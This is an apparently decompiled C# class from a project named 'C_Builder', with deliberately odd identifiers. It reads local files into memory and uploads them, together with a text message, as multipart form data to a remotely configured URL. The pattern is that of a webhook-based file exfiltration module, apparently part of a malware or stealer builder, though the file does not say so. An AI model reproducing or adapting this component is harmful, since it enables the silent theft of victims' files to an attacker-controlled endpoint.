using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;

namespace C_Builder
{
	// Token: 0x02000005 RID: 5
	public class IFOUGHTINWW1 : IDisposable
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000011 RID: 17 RVA: 0x00002F40 File Offset: 0x00001140
		// (set) Token: 0x06000012 RID: 18 RVA: 0x00002F48 File Offset: 0x00001148
		public string HANGURSELF { get; set; }

		// Token: 0x06000013 RID: 19 RVA: 0x00002F51 File Offset: 0x00001151
		public IFOUGHTINWW1()
		{
			this.dWebClient = new WebClient();
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002F64 File Offset: 0x00001164
		public void DANGDANG(string msgSend, string file = null, string filename = null)
		{
			if (file != null)
			{
				byte[] array = File.ReadAllBytes(file);
				if (filename == null)
				{
					throw new Exception("You didn't define filename.. format: \"*.txt\"");
				}
				IFOUGHTINWW1.content.Add(new ByteArrayContent(array), filename, filename);
			}
			HttpClient httpClient = new HttpClient();
			IFOUGHTINWW1.content.Add(new StringContent(msgSend), "content");
			HttpResponseMessage result = httpClient.PostAsync(this.HANGURSELF, IFOUGHTINWW1.content).Result;
			Console.WriteLine(result);
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002FD8 File Offset: 0x000011D8
		public void XDLSD(string file, string filename)
		{
			byte[] bytes = File.ReadAllBytes(file);
			IFOUGHTINWW1.filelist.Add(Encoding.Default.GetString(bytes) + "-###Split###-" + filename);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000300C File Offset: 0x0000120C
		public void XDLOLLMAO(string msgSend, bool attachments)
		{
			if (attachments)
			{
				foreach (string text in IFOUGHTINWW1.filelist)
				{
					string[] array = text.Split(new string[]
					{
						"-###Split###-"
					}, StringSplitOptions.None);
					byte[] bytes = Encoding.Default.GetBytes(array[0]);
					string text2 = array[1];
					IFOUGHTINWW1.content.Add(new ByteArrayContent(bytes), text2, text2);
				}
			}
			HttpClient httpClient = new HttpClient();
			IFOUGHTINWW1.content.Add(new StringContent(msgSend), "content");
			HttpResponseMessage result = httpClient.PostAsync(this.HANGURSELF, IFOUGHTINWW1.content).Result;
			Console.WriteLine(result);
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000030D8 File Offset: 0x000012D8
		public void Dispose()
		{
			this.dWebClient.Dispose();
		}

		// Token: 0x04000006 RID: 6
		private readonly WebClient dWebClient;

		// Token: 0x04000007 RID: 7
		private static MultipartFormDataContent content = new MultipartFormDataContent();

		// Token: 0x04000008 RID: 8
		private static List<string> filelist = new List<string>();
	}
}
